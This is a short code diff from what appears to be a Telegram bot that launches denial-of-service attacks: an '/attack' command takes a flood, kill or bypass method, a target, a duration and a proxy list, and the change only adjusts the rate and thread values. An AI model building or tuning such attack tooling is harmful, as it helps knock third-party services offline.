@@ -39,8 +39,8 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
   const method = params[0] && ['flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'flood';
   const target = params[1] || params[0];
   const time = parseInt(params[2] || params[1]);
-  const rate = 24;
-  const threads = 12;
+  const rate = 25;
+  const threads = 10;
   const proxyfile = './prx.txt';
   
   if (!target || !time) {
